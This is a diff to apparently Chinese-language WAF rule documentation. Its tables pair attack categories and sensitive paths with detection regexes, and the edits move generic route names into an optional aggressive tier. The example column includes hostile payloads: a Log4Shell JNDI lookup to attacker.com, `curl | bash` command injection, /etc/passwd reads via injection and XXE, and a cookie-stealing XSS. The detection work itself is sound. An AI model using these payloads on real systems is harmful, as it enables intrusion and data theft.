@@ -34,7 +34,7 @@
 | A3 | 时间 / 报错盲注 | 匹配延时函数和报错函数，用于无回显时探测数据库 | 盲注判断字段数、数据库版本 | `sleep\((\s*)(\d*)(\s*)\)`、`pg_sleep\s*\(`、`extractvalue\s*\(` |
 | A4 | 堆叠查询 / 写文件 | 阻止多语句执行和文件写入操作 | 通过 `;DROP TABLE` 删表，或通过 `INTO OUTFILE` 写 WebShell | `;\s*(drop\|delete\|insert\|update\|create\|alter)\s+`、`into\s+(outfile\|dumpfile)\s+` |
 | A5 | MySQL 注释绕过 | 匹配 MySQL 版本注释 `/*!50000 ... */`，用于绕过简单过滤 | 某些 WAF 不识别注释语法导致绕过 | `/\*!50000` |
-| A6 | NoSQL 注入 | 匹配 MongoDB 等 `$` 操作符注入 | 通过 `?id[$ne]=1` 绕过身份验证 | `\[\$where\]`、`"\$ne"`、`"\$gt"` |
+| A6 | NoSQL 注入 | 匹配 MongoDB 等 `$` 操作符注入（含 PHP 数组式参数注入） | 通过 `?id[$ne]=1` 绕过身份验证 | `\[\$where\]`、`"\$ne"`、`\[\$(ne\|gt\|...)\]` |
 | A7 | 命令注入 | 匹配反引号、`$()`、管道下载执行等 OS 命令注入 | `?ip=127.0.0.1;cat /etc/passwd` 或 `curl ... \| bash` | `` `.*` ``、`\$\(.*\)`、`(curl\|wget).*\|.*(bash\|sh\|cmd\|powershell)` |
 | A8 | 代码 / 文件包含执行 | PHP 危险函数、伪协议、Base64 解码 | `?file=php://filter/...` 或 `eval($_GET[x])` | `base64_decode\(`、`php://filter`、`php://input` |
 | A9 | 模板注入 SSTI | Spring/Pebbles/FreeMarker 等模板表达式注入 | `?name=${T(java.lang.Runtime).getRuntime()}` | `\$\{.*class.*\}`、`\#\{.*\}` |
@@ -42,9 +42,9 @@
 | A11 | XSS / HTML 注入 | 标签、事件处理器、DOM XSS payload | 在参数中植入 `<script>alert(1)</script>` 窃取用户 Cookie | `<(iframe\|script\|...)`,`(onmouseover\|onerror\|onload)\=` |
 | A12 | XML / XXE | 外部实体声明，导致文件读取、SSRF、内网探测 | `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` | `<!ENTITY`、`<!DOCTYPE.*SYSTEM` |
 | A13 | 反序列化 | Java Fastjson/Jackson、PHP、.NET 序列化特征 | 通过可控序列化数据触发 RCE | `"@type"`、rO0ABX、`O:\d+:"[^"]+":\d+:\{` |
-| A14 | JNDI / Log4Shell | Log4j JNDI 注入 (CVE-2021-44228) | `${jndi:ldap://attacker.com/exp}` 触发 RCE | `\$\{jndi:(ldap\|dns\|rmii\|...)` |
+| A14 | JNDI / Log4Shell | Log4j JNDI 注入 (CVE-2021-44228)，含 `${${lower:j}ndi:` 等嵌套混淆绕过 | `${jndi:ldap://attacker.com/exp}` 触发 RCE | `\$\{jndi:(ldap\|dns\|...)`、`\$\{[^}]{0,120}\$\{` |
 | A15 | Spring4Shell | Spring 框架 classloader 注入 (CVE-2022-22965) | 修改 Tomcat 访问日志配置写入 WebShell | `class\.module\.classLoader` |
-| A16 | JWT 算法绕过 | JWT 使用 `none` 算法绕过签名验证 | `{"alg":"none"}` 配合篡改 payload 越权 | `"alg"\s*:\s*"none"` |
+| A16 | JWT 算法绕过 | JWT 使用 `none` 算法绕过签名验证（`"kid"` 字段为正常 JWK 字段，已不单独拦截） | `{"alg":"none"}` 配合篡改 payload 越权 | `"alg"\s*:\s*"none"` |
 | A17 | 文件上传绕过 | 双扩展名、图片马等绕过服务端后缀检查 | 上传 `shell.php.jpg` 或 `GIF89a...<?php ...` | `\.(php\d?\|jsp\|...)\.(jpg\|jpeg\|...)`、`GIF89a.*<\?php` |
 | A18 | OOB / DNS 外带 | 外带域名特征，用于盲注、命令执行确认 | `whoami.attacker.dnslog.cn` | `\.(burpcollaborator\.net\|interact\.sh\|dnslog\.cn\|...)` |
 
@@ -78,7 +78,7 @@
 | D3 | Swagger / OpenAPI | API 文档接口暴露 | 攻击者通过文档快速发现可利用接口 | `swagger\.json`、`^/swagger-ui(/.*)?$`、`^/v[23]/api-docs` |
 | D4 | phpinfo / 状态页 | 服务器信息与调试页 | 泄露 PHP 版本、模块、路径、环境变量 | `^/phpinfo\.php$`、`^/nginx_status$` |
 | D5 | 调试工具 / 性能分析 | pprof、debugbar、profiler | 泄露内存、CPU、源码、SQL 等信息 | `^/debug/pprof(/.*)?$`、`^/_debugbar(/.*)?$` |
-| D6 | AI / Notebook 平台 | Gradio、Streamlit、Jupyter 入口 | 这些平台常缺乏认证，暴露后可执行代码 | `^/(gradio\|streamlit\|jupyter\|notebook)(/.*)?$` |
+| D6 | AI / Notebook 平台 | Gradio、Streamlit、Jupyter 入口 | 这些平台常缺乏认证，暴露后可执行代码 | `^/(gradio\|streamlit\|jupyter)(/.*)?$`（notebook 为常见业务名词，已归入 aggressive） |
 | D7 | CMS / 框架后台与安装入口 | WordPress、ThinkPHP、通用 admin/install | 弱口令爆破、未授权安装、配置泄露 | `^/wp-(login\|config\|admin)`、`^/thinkphp(/.*)?$` |
 | D8 | 上传目录脚本执行 | 上传目录中执行脚本 | 绕过上传限制后执行 WebShell | `^/(upload\|uploads\|...)/.*\.(php\d*\|jsp\|asp\|...)$` |
 | D9 | 已知高危 CVE / 通用漏洞路径 | PHPUnit RCE、WebLogic、JBoss、Solr、通达、帆软、Ueditor 等 | 一键利用已知漏洞获取权限 | `/vendor/phpunit/.../eval-stdin\.php`、`/_async/AsyncResponseService` |
@@ -94,7 +94,7 @@
 | D19 | K8s / Helm / Ansible | Chart.yaml、values.yaml、kustomization.yaml | 泄露集群配置、镜像拉取密钥 | `Chart\.ya?ml`、`values(-.*)?\.ya?ml` |
 | D20 | 系统 shell / 敏感路径探测 | /bin/bash、/etc/passwd、cmd.exe | 路径穿越或命令执行探测 | `/bin/(ba)?sh`、`/etc/passwd`、`cmd\.exe` |
 | D21 | WebShell / 命令执行文件名 | 常见 webshell 命名 | 已上传 WebShell 的访问路径 | `(webshell\|c99\|r57\|shell\|cmd\|exec)\.(php\|jsp\|...)` |
-| D22 | Java 监控 / 控制台 | Druid、H2 Console、Jolokia | 未授权访问数据库、执行 MBean 操作 | `^/druid(/.*)?$`、`^/h2-console(/.*)?$` |
+| D22 | Java 监控 / 控制台 | Druid、H2 Console、Jolokia | 未授权访问数据库、执行 MBean 操作 | `^/h2-console(/.*)?$`、`^/jolokia(/.*)?$`（druid 为常见奇幻词汇，已归入 aggressive） |
 | D23 | Git / 版本控制泄露 | .git 目录、.git-credentials | 源码、仓库凭据泄露 | `\.git/`、`\.git-credentials` |
 | D24 | LLM / OpenAI API 探测 | 模型、嵌入、补全接口 | 未授权调用大模型 API，造成资源滥用 | `^/v1/(models\|embeddings\|chat/completions\|completions\|images\|audio\|files\|fine-tunes\|batches\|assistants\|threads\|vector_stores\|moderations\|realtime)$` |
 | D25 | 版本 / API 根路径探测 | 通用探测 | 测绘、版本识别 | `^/version$`、`^/v1$` |
@@ -105,6 +105,7 @@
 
 > **说明**：以 `# [core]` 标注的规则为默认启用，误伤较低；以 `# [aggressive]` 标注的规则误伤风险较高，按需启用（`BlockAggressive=on` 时生效）。
 > 自 2026-07 起，与常见业务路由冲突的通用名词路径（`/dashboard`、`/docs`、`/jobs`、`/api/auth/*`、`/v1/auth`、`/wiki`、`/console`、`/play`、`/stats` 等）也已归入 `[aggressive]`，core 区只保留指向性明确的敏感路径。
+> 2026-07-26 起，以下"产品名即常见英文单词/通用路由"的规则也从 core 归入 `[aggressive]`：`/red`、`/notebook`、`/ghost`、`/nova`、`/horizon`、`/telescope`、`/backpack`、`/filament`、`/filemanager`、`/druid`、`/kafka`、`/sinatra`、`/cassandra`、`/pulsar`、`/nats`、`/envoy`、`/exhibitor`、`/zookeeper`、`/c3`、`/monitoring`、`/script`、`/scriptText`、`/app/history`、`/core/auth/login`、`/rest/api/2/user`、`/api-auth`、`/v2/keys`、`/v3/auth`、`/user/register`、`/user/password`。
 
 ---
 
